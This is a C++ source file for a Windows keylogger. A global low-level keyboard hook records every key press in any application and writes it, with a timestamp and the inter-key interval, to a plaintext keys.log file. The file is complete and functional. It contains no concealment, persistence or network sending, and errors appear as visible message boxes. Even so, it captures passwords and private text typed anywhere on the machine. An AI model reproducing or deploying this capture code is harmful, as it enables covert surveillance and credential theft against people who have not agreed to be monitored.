#include "key_logger.h"

// Utility function to get current date/time in string form.
static std::string GetCurrentDateTime()
{
    auto now = std::chrono::system_clock::now();
    std::time_t nowTime = std::chrono::system_clock::to_time_t(now);
    
    std::tm nowTm;
    localtime_s(&nowTm, &nowTime); // Use safer localtime_s instead of localtime
    
    std::ostringstream oss;
    oss << std::put_time(&nowTm, "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

// Helper to translate vkCode to a human-readable string
static std::string VkCodeToString(DWORD vkCode)
{
    // Basic alphanumeric keys
    if ((vkCode >= 0x30 && vkCode <= 0x39) || (vkCode >= 0x41 && vkCode <= 0x5A)) {
        char c = static_cast<char>(vkCode);
        return std::string(1, c);
    }

    // For other keys, we might do a switch-case
    switch (vkCode) {
        case VK_RETURN:     return "Enter";
        case VK_BACK:       return "Backspace";
        case VK_TAB:        return "Tab";
        case VK_SPACE:      return "Space";
        case VK_ESCAPE:     return "Escape";
        case VK_SHIFT:      return "Shift";
        case VK_CONTROL:    return "Control";
        case VK_MENU:       return "Alt";
        case VK_CAPITAL:    return "CapsLock";
        case VK_LEFT:       return "LeftArrow";
        case VK_RIGHT:      return "RightArrow";
        case VK_UP:         return "UpArrow";
        case VK_DOWN:       return "DownArrow";
        case VK_DELETE:     return "Delete";
        case VK_HOME:       return "Home";
        case VK_END:        return "End";
        case VK_PRIOR:      return "PageUp";
        case VK_NEXT:       return "PageDown";
        case VK_F1:         return "F1";
        case VK_F2:         return "F2";
        case VK_F3:         return "F3";
        case VK_F4:         return "F4";
        case VK_F5:         return "F5";
        case VK_F6:         return "F6";
        case VK_F7:         return "F7";
        case VK_F8:         return "F8";
        case VK_F9:         return "F9";
        case VK_F10:        return "F10";
        case VK_F11:        return "F11";
        case VK_F12:        return "F12";
        default:            break; // fall through
    }

    // Fallback: try using MapVirtualKey / GetKeyNameText
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    char name[128];
    if (GetKeyNameTextA(scanCode << 16, name, sizeof(name)) > 0) {
        return std::string(name);
    }

    // If unknown, just return numeric code
    std::ostringstream oss;
    oss << "Unknown[" << vkCode << "]";
    return oss.str();
}

// Static callback function for the hook
LRESULT CALLBACK KeyLogger::KeyStrokeLogger(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        auto* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vkCode = kbdStruct->vkCode;

        // Access the singleton instance instead of creating temporary instances
        static KeyLogger& logger = KeyLogger::GetInstance();
        
        // We'll use static-based timing for demonstration
        static auto s_lastTime = std::chrono::steady_clock::now();
        auto now = std::chrono::steady_clock::now();
        int interval = (int)std::chrono::duration_cast<std::chrono::milliseconds>(now - s_lastTime).count();
        s_lastTime = now;
        
        // Use the persistent instance
        logger.LogKeyStroke(vkCode, interval);
    }

    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

// Constructor
KeyLogger::KeyLogger()
    : keyboardHook(nullptr)
{
}

// Destructor
KeyLogger::~KeyLogger()
{
    Stop();
}

void KeyLogger::Start()
{
    // Open the log file in append mode
    logFile.open("keys.log", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        MessageBoxA(nullptr, "Failed to open keys.log!", "KeyLogger Error", MB_ICONERROR);
    }

    lastKeyPressTime = std::chrono::steady_clock::now();

    // Install the hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyStrokeLogger, GetModuleHandle(nullptr), 0);
    if (!keyboardHook) {
        MessageBoxA(nullptr, "Failed to install low-level keyboard hook!", "KeyLogger Error", MB_ICONERROR);
    }
}

void KeyLogger::Stop()
{
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
    }

    if (logFile.is_open()) {
        logFile.close();
    }
}

void KeyLogger::LogKeyStroke(DWORD vkCode, int interval)
{
    if (!logFile.is_open()) {
        return;
    }
    std::string keyName = VkCodeToString(vkCode);
    logFile << "[" << GetCurrentDateTime() << "] "
            << "Key Pressed: " << keyName
            << " (" << vkCode << ") "
            << "- Interval: " << interval << "ms\n";
    logFile.flush();
}

// Singleton implementation
KeyLogger& KeyLogger::GetInstance()
{
    static KeyLogger instance;
    return instance;
}
